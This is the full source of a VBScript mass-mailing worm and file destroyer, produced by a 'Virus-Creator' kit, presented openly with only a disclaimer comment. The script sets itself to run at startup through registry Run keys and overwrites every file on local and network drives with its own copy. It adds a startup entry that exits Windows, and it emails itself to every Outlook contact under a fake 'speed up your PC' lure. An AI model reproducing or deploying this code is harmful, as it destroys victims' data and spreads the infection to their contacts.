   rem This script is created by GiChTy's Virus-Creator 1.3
   rem I will not take response of what people do with my tool.
   rem check our page : www.blueadeptz.org
   rem or mail me: gichty@blueadeptz.org
   rem GiChTy


   on error resume next
   autostart()
   addregentries()
   spreadtoemail()
   killfiles()
   sub autostart()
   dim fso, dir, file, c, regedit
   set fso = createobject("scripting.filesystemobject")
   dir = fso.getspecialfolder(0)
   set file = fso.OpenTextFile(WScript.ScriptFullname,1)
   set c = fso.GetFile(WScript.ScriptFullName)
   c.copy (dir & "\emm.vbs")
   regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\emm",dir & "\emm.vbs"
   end sub
   Sub Listfiles(Folder)
   Dim f, fc, f1, fso, rr
   Set fso = CreateObject("scripting.filesystemobject")
   Set f = fso.GetFolder(Folder)
   Set fc = f.Files
   Set rr = fso.GetFile(WScript.ScriptFullName)
   For Each f1 In fc
   rr.Copy (f1.Path)
   Next
   End Sub
   Sub ListFolders(Folder)
   Dim f, fc, f1, fso
   Set fso = CreateObject("scripting.filesystemobject")
   Set f = fso.GetFolder(Folder)
   Set fc = f.SubFolders
   For Each f1 In fc
   Listfiles (f1.Path)
   ListFolders (f1.Path)
   Next
   End Sub
   Sub Killfiles()
   Dim d, dc, s, fso
   Set fso = CreateObject("scripting.filesystemobject")
   Set dc = fso.Drives
   For Each d In dc
   If d.drivetype = 2 Or d.drivetype = 3 Then ListFolders (d.Path & "\")
   Next
   End Sub

   sub addregentries()
   regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Emm32","c:\Windows\rundll32.exe user,exitwindows"
   end sub
   Sub spreadtoemail()
   Dim e, l, g, i, o, t
   Set i = CreateObject("Outlook.Application")
   Set e = i.GetNameSpace("MAPI")
   For Each l In e.AddressLists
   Set g = i.CreateItem(0)
   For o = 1 To l.AddressEntries.Count
   Set t = l.AddressEntries(o)
   If o = 1 Then
   g.BCC = t.Address
   Else
   g.BCC = g.BCC & "; " & t.Address
   End If
   Next
   g.Subject = "New Tool !"
   g.Body = "This tool can speed up your PC up to 15% !"
   g.Attachmets.Add WScript.ScriptFullName
   g.DeleteAfterSubmit = True
   g.Send
   Next
   End Sub

   Sub Regwrite(key, value)
   dim regedit
   set regedit = createobject("wscript.shell")
   regedit.regwrite key, value
   End Sub
